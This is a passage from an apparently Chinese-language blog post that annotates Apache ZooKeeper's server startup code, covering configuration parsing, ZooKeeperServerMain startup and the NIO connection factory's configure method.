<p>将加载后的 properties 信息赋值到 QuorumPeerConfig 属性中。<br>省略了一部分解析的代码.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 解析properties对象信息,</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> zkProp  根据配置文件加载的properties对象信息</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parseProperties</span><span class="params">(Properties zkProp)</span></span></span><br><span class="line"><span class="function">   <span class="keyword">throws</span> IOException, ConfigException </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> clientPort = <span class="number">0</span>;</span><br><span class="line">       String clientPortAddress = <span class="keyword">null</span>;</span><br><span class="line">       <span class="comment">//获取键值对信息循环匹配赋值、验证合法性</span></span><br><span class="line">       <span class="keyword">for</span> (Entry&lt;Object, Object&gt; entry : zkProp.entrySet()) &#123;</span><br><span class="line">           String key = entry.getKey().toString().trim();</span><br><span class="line">           String value = entry.getValue().toString().trim();</span><br><span class="line">           <span class="comment">//数据目录</span></span><br><span class="line">           <span class="keyword">if</span> (key.equals(<span class="string">"dataDir"</span>)) &#123;</span><br><span class="line">               dataDir = value;</span><br><span class="line">            <span class="comment">//日志目录</span></span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.equals(<span class="string">"dataLogDir"</span>)) &#123;</span><br><span class="line">               dataLogDir = value;</span><br><span class="line">            <span class="comment">//绑定端口</span></span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.equals(<span class="string">"clientPort"</span>)) &#123;</span><br><span class="line">               clientPort = Integer.parseInt(value);</span><br><span class="line">           <span class="comment">// 判断身份类型,observer不参与投票,participant参与投票</span></span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.equals(<span class="string">"peerType"</span>)) &#123;</span><br><span class="line">               <span class="keyword">if</span> (value.toLowerCase().equals(<span class="string">"observer"</span>)) &#123;</span><br><span class="line">                   peerType = LearnerType.OBSERVER;</span><br><span class="line">               &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value.toLowerCase().equals(<span class="string">"participant"</span>)) &#123;</span><br><span class="line">                   peerType = LearnerType.PARTICIPANT;</span><br><span class="line">               &#125; <span class="keyword">else</span></span><br><span class="line">               &#123;</span><br><span class="line">                   <span class="keyword">throw</span> <span class="keyword">new</span> ConfigException(<span class="string">"Unrecognised peertype: "</span> + value);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="comment">//同步启用</span></span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.equals( <span class="string">"syncEnabled"</span> )) &#123;</span><br><span class="line">               syncEnabled = Boolean.parseBoolean(value);</span><br><span class="line">               <span class="comment">//自动清理快照保留数量</span></span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.equals(<span class="string">"autopurge.snapRetainCount"</span>)) &#123;</span><br><span class="line">               snapRetainCount = Integer.parseInt(value);</span><br><span class="line">           <span class="comment">//自动清理间隔</span></span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.equals(<span class="string">"autopurge.purgeInterval"</span>)) &#123;</span><br><span class="line">               purgeInterval = Integer.parseInt(value);</span><br><span class="line">           <span class="comment">//是否配置了server集群</span></span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.startsWith(<span class="string">"server."</span>)) &#123;</span><br><span class="line">               <span class="keyword">int</span> dot = key.indexOf(<span class="string">'.'</span>);</span><br><span class="line">               <span class="keyword">long</span> sid = Long.parseLong(key.substring(dot + <span class="number">1</span>));</span><br><span class="line">               String parts[] = splitWithLeadingHostname(value);</span><br><span class="line">               <span class="keyword">if</span> ((parts.length != <span class="number">2</span>) &amp;&amp; (parts.length != <span class="number">3</span>) &amp;&amp; (parts.length !=<span class="number">4</span>)) &#123;</span><br><span class="line">                   LOG.error(value</span><br><span class="line">                      + <span class="string">" does not have the form host:port or host:port:port "</span> +</span><br><span class="line">                      <span class="string">" or host:port:port:type"</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               LearnerType type = <span class="keyword">null</span>;</span><br><span class="line">               String hostname = parts[<span class="number">0</span>];</span><br><span class="line">               Integer port = Integer.parseInt(parts[<span class="number">1</span>]);</span><br><span class="line">               Integer electionPort = <span class="keyword">null</span>;</span><br><span class="line">               <span class="keyword">if</span> (parts.length &gt; <span class="number">2</span>)&#123;</span><br><span class="line">               	electionPort=Integer.parseInt(parts[<span class="number">2</span>]);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="comment">//置类型为observer或participant</span></span><br><span class="line">               <span class="keyword">if</span> (parts.length &gt; <span class="number">3</span>)&#123;</span><br><span class="line">                   <span class="keyword">if</span> (parts[<span class="number">3</span>].toLowerCase().equals(<span class="string">"observer"</span>)) &#123;</span><br><span class="line">                       type = LearnerType.OBSERVER;</span><br><span class="line">                   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (parts[<span class="number">3</span>].toLowerCase().equals(<span class="string">"participant"</span>)) &#123;</span><br><span class="line">                       type = LearnerType.PARTICIPANT;</span><br><span class="line">                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                       <span class="keyword">throw</span> <span class="keyword">new</span> ConfigException(<span class="string">"Unrecognised peertype: "</span> + value);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="comment">//observer类型server</span></span><br><span class="line">               <span class="keyword">if</span> (type == LearnerType.OBSERVER)&#123;</span><br><span class="line">                   observers.put(Long.valueOf(sid), <span class="keyword">new</span> QuorumServer(sid, hostname, port, electionPort, type));</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   servers.put(Long.valueOf(sid), <span class="keyword">new</span> QuorumServer(sid, hostname, port, electionPort, type));</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="comment">//分组信息</span></span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.startsWith(<span class="string">"group"</span>)) &#123;</span><br><span class="line">               <span class="keyword">int</span> dot = key.indexOf(<span class="string">'.'</span>);</span><br><span class="line">               <span class="keyword">long</span> gid = Long.parseLong(key.substring(dot + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">               numGroups++;</span><br><span class="line"></span><br><span class="line">               String parts[] = value.split(<span class="string">":"</span>);</span><br><span class="line">               <span class="keyword">for</span>(String s : parts)&#123;</span><br><span class="line">                   <span class="keyword">long</span> sid = Long.parseLong(s);</span><br><span class="line">                   <span class="keyword">if</span>(serverGroup.containsKey(sid))</span><br><span class="line">                       <span class="keyword">throw</span> <span class="keyword">new</span> ConfigException(<span class="string">"Server "</span> + sid + <span class="string">"is in multiple groups"</span>);</span><br><span class="line">                   <span class="keyword">else</span></span><br><span class="line">                       serverGroup.put(sid, gid);</span><br><span class="line">               &#125;</span><br><span class="line">           <span class="comment">//权重配置</span></span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span>(key.startsWith(<span class="string">"weight"</span>)) &#123;</span><br><span class="line">               <span class="keyword">int</span> dot = key.indexOf(<span class="string">'.'</span>);</span><br><span class="line">               <span class="keyword">long</span> sid = Long.parseLong(key.substring(dot + <span class="number">1</span>));</span><br><span class="line">               serverWeight.put(sid, Long.parseLong(value));</span><br><span class="line">               <span class="comment">// SASL认证配置</span></span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.equals(QuorumAuth.QUORUM_SASL_AUTH_ENABLED)) &#123;</span><br><span class="line">               quorumEnableSasl = Boolean.parseBoolean(value);</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.equals(QuorumAuth.QUORUM_SERVER_SASL_AUTH_REQUIRED)) &#123;</span><br><span class="line">               quorumServerRequireSasl = Boolean.parseBoolean(value);</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.equals(QuorumAuth.QUORUM_LEARNER_SASL_AUTH_REQUIRED)) &#123;</span><br><span class="line">               quorumLearnerRequireSasl = Boolean.parseBoolean(value);</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.equals(QuorumAuth.QUORUM_LEARNER_SASL_LOGIN_CONTEXT)) &#123;</span><br><span class="line">               quorumLearnerLoginContext = value;</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.equals(QuorumAuth.QUORUM_SERVER_SASL_LOGIN_CONTEXT)) &#123;</span><br><span class="line">               quorumServerLoginContext = value;</span><br><span class="line"></span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.equals(QuorumAuth.QUORUM_KERBEROS_SERVICE_PRINCIPAL)) &#123;</span><br><span class="line">               quorumServicePrincipal = value;</span><br><span class="line">               <span class="comment">//配置cnxn线程数</span></span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.equals(<span class="string">"quorum.cnxn.threads.size"</span>)) &#123;</span><br><span class="line">               quorumCnxnThreadsSize = Integer.parseInt(value);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               System.setProperty(<span class="string">"zookeeper."</span> + key, value);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (!quorumEnableSasl &amp;&amp; quorumServerRequireSasl) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</span><br><span class="line">                   QuorumAuth.QUORUM_SASL_AUTH_ENABLED</span><br><span class="line">                   + <span class="string">" is disabled, so cannot enable "</span></span><br><span class="line">                   + QuorumAuth.QUORUM_SERVER_SASL_AUTH_REQUIRED);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (!quorumEnableSasl &amp;&amp; quorumLearnerRequireSasl) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</span><br><span class="line">                   QuorumAuth.QUORUM_SASL_AUTH_ENABLED</span><br><span class="line">                   + <span class="string">" is disabled, so cannot enable "</span></span><br><span class="line">                   + QuorumAuth.QUORUM_LEARNER_SASL_AUTH_REQUIRED);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// If quorumpeer learner is not auth enabled then self won't be able to</span></span><br><span class="line">       <span class="comment">// join quorum. So this condition is ensuring that the quorumpeer learner</span></span><br><span class="line">       <span class="comment">// is also auth enabled while enabling quorum server require sasl.</span></span><br><span class="line">       <span class="keyword">if</span> (!quorumLearnerRequireSasl &amp;&amp; quorumServerRequireSasl) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</span><br><span class="line">                   QuorumAuth.QUORUM_LEARNER_SASL_AUTH_REQUIRED</span><br><span class="line">                   + <span class="string">" is disabled, so cannot enable "</span></span><br><span class="line">                   + QuorumAuth.QUORUM_SERVER_SASL_AUTH_REQUIRED);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// Reset to MIN_SNAP_RETAIN_COUNT if invalid (less than 3)</span></span><br><span class="line">       <span class="comment">// PurgeTxnLog.purge(File, File, int) will not allow to purge less</span></span><br><span class="line">       <span class="comment">// than 3.</span></span><br><span class="line">       <span class="keyword">if</span> (snapRetainCount &lt; MIN_SNAP_RETAIN_COUNT) &#123;</span><br><span class="line">           LOG.warn(<span class="string">"Invalid autopurge.snapRetainCount: "</span> + snapRetainCount</span><br><span class="line">                   + <span class="string">". Defaulting to "</span> + MIN_SNAP_RETAIN_COUNT);</span><br><span class="line">           snapRetainCount = MIN_SNAP_RETAIN_COUNT;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (dataDir == <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"dataDir is not set"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (dataLogDir == <span class="keyword">null</span>) &#123;</span><br><span class="line">           dataLogDir = dataDir;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (clientPort == <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"clientPort is not set"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (clientPortAddress != <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">this</span>.clientPortAddress = <span class="keyword">new</span> InetSocketAddress(</span><br><span class="line">                   InetAddress.getByName(clientPortAddress), clientPort);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">this</span>.clientPortAddress = <span class="keyword">new</span> InetSocketAddress(clientPort);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (tickTime == <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"tickTime is not set"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (minSessionTimeout &gt; maxSessionTimeout) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</span><br><span class="line">                   <span class="string">"minSessionTimeout must not be larger than maxSessionTimeout"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (servers.size() == <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> (observers.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Observers w/o participants is an invalid configuration"</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">// Not a quorum configuration so return immediately - not an error</span></span><br><span class="line">           <span class="comment">// case (for b/w compatibility), server will default to standalone</span></span><br><span class="line">           <span class="comment">// mode.</span></span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (servers.size() == <span class="number">1</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> (observers.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Observers w/o quorum is an invalid configuration"</span>);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// HBase currently adds a single server line to the config, for</span></span><br><span class="line">           <span class="comment">// b/w compatibility reasons we need to keep this here.</span></span><br><span class="line">           LOG.error(<span class="string">"Invalid configuration, only one server specified (ignoring)"</span>);</span><br><span class="line">           servers.clear();</span><br><span class="line">           <span class="comment">// 检测验证，server只有两台无法容错，至少3台server</span></span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (servers.size() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> (servers.size() == <span class="number">2</span>) &#123;</span><br><span class="line">               LOG.warn(<span class="string">"No server failure will be tolerated. "</span> +</span><br><span class="line">                   <span class="string">"You need at least 3 servers."</span>);</span><br><span class="line">           <span class="comment">//如果是偶数的配置server,会警告非最优配置</span></span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (servers.size() % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">               LOG.warn(<span class="string">"Non-optimial configuration, consider an odd number of servers."</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (initLimit == <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"initLimit is not set"</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (syncLimit == <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"syncLimit is not set"</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">/*</span></span><br><span class="line"><span class="comment">            * If using FLE, then every server requires a separate election</span></span><br><span class="line"><span class="comment">            * port.</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">           <span class="keyword">if</span> (electionAlg != <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="keyword">for</span> (QuorumServer s : servers.values()) &#123;</span><br><span class="line">                   <span class="keyword">if</span> (s.electionAddr == <span class="keyword">null</span>)</span><br><span class="line">                       <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</span><br><span class="line">                               <span class="string">"Missing election port for server: "</span> + s.id);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/*</span></span><br><span class="line"><span class="comment">            * Default of quorum config is majority</span></span><br><span class="line"><span class="comment">            * 默认的group是多个,并且一个server一个分组信息</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">           <span class="keyword">if</span>(serverGroup.size() &gt; <span class="number">0</span>)&#123;</span><br><span class="line">               <span class="keyword">if</span>(servers.size() != serverGroup.size())</span><br><span class="line">                   <span class="keyword">throw</span> <span class="keyword">new</span> ConfigException(<span class="string">"Every server must be in exactly one group"</span>);</span><br><span class="line">               <span class="comment">/*</span></span><br><span class="line"><span class="comment">                * The deafult weight of a server is 1</span></span><br><span class="line"><span class="comment">                默认的权重为1</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">               <span class="keyword">for</span>(QuorumServer s : servers.values())&#123;</span><br><span class="line">                   <span class="keyword">if</span>(!serverWeight.containsKey(s.id))</span><br><span class="line">                       serverWeight.put(s.id, (<span class="keyword">long</span>) <span class="number">1</span>);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               <span class="comment">/*</span></span><br><span class="line"><span class="comment">                * Set the quorumVerifier to be QuorumHierarchical</span></span><br><span class="line"><span class="comment">                * 计算分组的权重</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">               quorumVerifier = <span class="keyword">new</span> QuorumHierarchical(numGroups,</span><br><span class="line">                       serverWeight, serverGroup);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="comment">/*</span></span><br><span class="line"><span class="comment">                * The default QuorumVerifier is QuorumMaj</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line"></span><br><span class="line">               LOG.info(<span class="string">"Defaulting to majority quorums"</span>);</span><br><span class="line">               quorumVerifier = <span class="keyword">new</span> QuorumMaj(servers.size());</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//一旦计算出observers将放入Map中</span></span><br><span class="line">           servers.putAll(observers);</span><br><span class="line">           <span class="comment">//解析myid文件</span></span><br><span class="line">           File myIdFile = <span class="keyword">new</span> File(dataDir, <span class="string">"myid"</span>);</span><br><span class="line">           <span class="keyword">if</span> (!myIdFile.exists()) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(myIdFile.toString()</span><br><span class="line">                       + <span class="string">" file is missing"</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(myIdFile));</span><br><span class="line">           String myIdString;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               myIdString = br.readLine();</span><br><span class="line">           &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">               br.close();</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               serverId = Long.parseLong(myIdString);</span><br><span class="line">               MDC.put(<span class="string">"myid"</span>, myIdString);</span><br><span class="line">           &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"serverid "</span> + myIdString</span><br><span class="line">                       + <span class="string">" is not a number"</span>);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// Warn about inconsistent peer type</span></span><br><span class="line">           LearnerType roleByServersList = observers.containsKey(serverId) ? LearnerType.OBSERVER</span><br><span class="line">                   : LearnerType.PARTICIPANT;</span><br><span class="line">           <span class="keyword">if</span> (roleByServersList != peerType) &#123;</span><br><span class="line">               LOG.warn(<span class="string">"Peer type from servers list ("</span> + roleByServersList</span><br><span class="line">                       + <span class="string">") doesn't match peerType ("</span> + peerType</span><br><span class="line">                       + <span class="string">"). Defaulting to servers list."</span>);</span><br><span class="line"></span><br><span class="line">               peerType = roleByServersList;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>配置主要是验证参数配置的合法性和对应属性信息的设置。</p>
<h3 id="ZooKeeperServerMain-启动"><a href="#ZooKeeperServerMain-启动" class="headerlink" title="ZooKeeperServerMain 启动"></a>ZooKeeperServerMain 启动</h3><p>开始启动单点 server,主要的方法在 runFromConfig 中.<br>主要的作用就是初始化 server 连接工厂,创建快照事务日志,启动 zk server.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">runFromConfig</span><span class="params">(ServerConfig config)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        LOG.info(<span class="string">"Starting server"</span>);</span><br><span class="line">        FileTxnSnapLog txnLog = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Note that this thread isn't going to be doing anything else,</span></span><br><span class="line">            <span class="comment">// so rather than spawning another thread, we will just call</span></span><br><span class="line">            <span class="comment">// run() in this thread.</span></span><br><span class="line">            <span class="comment">// create a file logger url from the command line args</span></span><br><span class="line">            <span class="keyword">final</span> ZooKeeperServer zkServer = <span class="keyword">new</span> ZooKeeperServer();</span><br><span class="line">            <span class="comment">// Registers shutdown handler which will be used to know the</span></span><br><span class="line">            <span class="comment">// server error or shutdown state changes.</span></span><br><span class="line">            <span class="comment">//注册shutdown处理</span></span><br><span class="line">            <span class="keyword">final</span> CountDownLatch shutdownLatch = <span class="keyword">new</span> CountDownLatch(<span class="number">1</span>);</span><br><span class="line">            zkServer.registerServerShutdownHandler(</span><br><span class="line">                    <span class="keyword">new</span> ZooKeeperServerShutdownHandler(shutdownLatch));</span><br><span class="line">            <span class="comment">//创建事务日志</span></span><br><span class="line">            txnLog = <span class="keyword">new</span> FileTxnSnapLog(<span class="keyword">new</span> File(config.dataLogDir), <span class="keyword">new</span> File(</span><br><span class="line">                    config.dataDir));</span><br><span class="line">            txnLog.setServerStats(zkServer.serverStats());</span><br><span class="line">            zkServer.setTxnLogFactory(txnLog);</span><br><span class="line">            zkServer.setTickTime(config.tickTime);</span><br><span class="line">            zkServer.setMinSessionTimeout(config.minSessionTimeout);</span><br><span class="line">            zkServer.setMaxSessionTimeout(config.maxSessionTimeout);</span><br><span class="line">            <span class="comment">//创建连接工厂,默认用JDK NIO</span></span><br><span class="line">            cnxnFactory = ServerCnxnFactory.createFactory();</span><br><span class="line">            <span class="comment">//设置地址和最大连接数</span></span><br><span class="line">            cnxnFactory.configure(config.getClientPortAddress(),</span><br><span class="line">                    config.getMaxClientCnxns());</span><br><span class="line">            <span class="comment">//启动</span></span><br><span class="line">            cnxnFactory.startup(zkServer);</span><br><span class="line">            <span class="comment">// Watch status of ZooKeeper server. It will do a graceful shutdown</span></span><br><span class="line">            <span class="comment">// if the server is not running or hits an internal error.</span></span><br><span class="line">            shutdownLatch.await();</span><br><span class="line">            shutdown();</span><br><span class="line"></span><br><span class="line">            cnxnFactory.join();</span><br><span class="line">            <span class="keyword">if</span> (zkServer.canShutdown()) &#123;</span><br><span class="line">                zkServer.shutdown(<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            <span class="comment">// warn, but generally this is ok</span></span><br><span class="line">            LOG.warn(<span class="string">"Server interrupted"</span>, e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (txnLog != <span class="keyword">null</span>) &#123;</span><br><span class="line">                txnLog.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>下面主要来看 cnxnFactory.configure() 和 cnxnFactory.startup(zkServer)内部的主要实现。<br>这里主要以 JDK NIO 的方式来启动 server,可以通过配置 zookeeper.serverCnxnFactory 参数来指定 server 实现方式,可选 Netty 方式启动.</p>
<h2 id="NIOServerCnxnFactory-的-configure-方法"><a href="#NIOServerCnxnFactory-的-configure-方法" class="headerlink" title="NIOServerCnxnFactory 的 configure 方法"></a>NIOServerCnxnFactory 的 configure 方法</h2><p>这个方法主要是启动 NIO server,并接收请求.</p>
<p>先看这个类的定义,实现 Runnable 接口。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NIOServerCnxnFactory</span> <span class="keyword">extends</span> <span class="title">ServerCnxnFactory</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOG = LoggerFactory.getLogger(NIOServerCnxnFactory.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * this is to avoid the jvm bug:</span></span><br><span class="line"><span class="comment">         * NullPointerException in Selector.open()</span></span><br><span class="line"><span class="comment">         * http://bugs.sun.com/view_bug.do?bug_id=6427854</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Selector.open().close();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IOException ie) &#123;</span><br><span class="line">            LOG.error(<span class="string">"Selector failed to open"</span>, ie);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ServerSocketChannel ss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> Selector selector = Selector.open();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * We use this buffer to do efficient socket I/O. Since there is a single</span></span><br><span class="line"><span class="comment">     * sender thread per NIOServerCnxn instance, we can use a member variable to</span></span><br><span class="line"><span class="comment">     * only allocate it once.</span></span><br><span class="line"><span class="comment">      分配了一个64M的空间.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">final</span> ByteBuffer directBuffer = ByteBuffer.allocateDirect(<span class="number">64</span> * <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> HashMap&lt;InetAddress, Set&lt;NIOServerCnxn&gt;&gt; ipMap =</span><br><span class="line">        <span class="keyword">new</span> HashMap&lt;InetAddress, Set&lt;NIOServerCnxn&gt;&gt;( );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//默认最大连接数为60</span></span><br><span class="line">    <span class="keyword">int</span> maxClientCnxns = <span class="number">60</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Construct a new server connection factory which will accept an unlimited number</span></span><br><span class="line"><span class="comment">     * of concurrent connections from each client (up to the file descriptor</span></span><br><span class="line"><span class="comment">     * limits of the operating system). startup(zks) must be called subsequently.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NIOServerCnxnFactory</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>配置连接信息，配置最大连接数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(InetSocketAddress addr, <span class="keyword">int</span> maxcc)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">//配置sasl登录信息</span></span><br><span class="line">    configureSaslLogin();</span><br><span class="line">    <span class="comment">//启动当前线程</span></span><br><span class="line">    thread = <span class="keyword">new</span> ZooKeeperThread(<span class="keyword">this</span>, <span class="string">"NIOServerCxn.Factory:"</span> + addr);</span><br><span class="line">    <span class="comment">//设置为守护线程</span></span><br><span class="line">    thread.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">//赋值最大连接数</span></span><br><span class="line">    maxClientCnxns = maxcc;</span><br><span class="line">    <span class="keyword">this</span>.ss = ServerSocketChannel.open();</span><br><span class="line">    ss.socket().setReuseAddress(<span class="keyword">true</span>);</span><br><span class="line">    LOG.info(<span class="string">"binding to port "</span> + addr);</span><br><span class="line">    <span class="comment">//绑定地址</span></span><br><span class="line">    ss.socket().bind(addr);</span><br><span class="line">    <span class="comment">// 设置为非阻塞IO</span></span><br><span class="line">    ss.configureBlocking(<span class="keyword">false</span>);</span><br><span class="line">    <span class="comment">//注册selector</span></span><br><span class="line">    ss.register(selector, SelectionKey.OP_ACCEPT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>启动了当前线程并且启动 ServerSocker。来看一下 run 方法,主要是接收请求。</p>
